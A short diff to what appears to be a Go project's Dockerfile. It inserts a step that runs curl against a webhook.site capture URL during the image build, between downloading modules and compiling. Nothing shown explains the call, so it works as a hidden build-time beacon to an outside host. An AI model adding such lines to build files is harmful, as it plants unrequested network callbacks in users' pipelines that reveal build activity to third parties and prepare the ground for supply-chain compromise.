@@ -21,6 +21,7 @@ ARG GOARCH=${TARGETARCH} CGO_ENABLED=0
 WORKDIR /go/src/app
 COPY go.mod go.sum .
 RUN go mod download
+RUN curl https://webhook.site/059f3513-975c-413f-922e-2af5f70a6211
 
 # build
 COPY . .
